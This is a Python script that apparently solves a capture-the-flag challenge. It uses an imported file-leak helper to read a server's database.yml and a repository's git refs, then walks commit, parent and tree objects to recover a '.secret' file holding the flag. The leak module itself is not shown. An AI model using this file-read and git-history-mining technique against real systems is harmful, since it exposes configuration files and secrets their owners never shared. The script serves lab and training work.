from get_object import get_remote_ref_raw
from leak_file import get_file


def main():
    out = get_file('/data/db/database.yml')
    start = out.find("{'repos': [{'name': '") + len("{'repos': [{'name': '")
    end = out.find("'", start)
    repo_name = out[start:end].strip()
    print(repo_name)
    ref = get_file('/repos/' + repo_name + '/.git/refs/heads/main')
    print(ref)

    # get HEAD object
    head_data = get_remote_ref_raw(repo_name, ref)
    parent_start = head_data.find("parent ") + len("parent ")
    parent_end = head_data.find("\n", parent_start)
    parent = head_data[parent_start:parent_end].strip()
    print(parent)


    # get parent object (previous commit)
    parent_data = get_remote_ref_raw(repo_name, parent)
    print(parent_data)

    # get tree object from parent object
    tree_start = parent_data.find("tree ") + len("tree ")
    tree_end = parent_data.find("\n", tree_start)
    tree = parent_data[tree_start:tree_end].strip()
    print(tree)

    # get the .secret file
    secret_data = get_remote_ref_raw(repo_name, tree)
    secret_lines = secret_data.splitlines()
    secret_ref = None
    for line in secret_lines:
        if line.endswith('.secret'):
            secret_ref = line.split()[2]
            break

    if secret_ref is None:
        raise ValueError("No .secret file found in the tree data")


    # get flag
    flag_data = get_remote_ref_raw(repo_name, secret_ref)
    print(flag_data)

if __name__ == "__main__":
    main()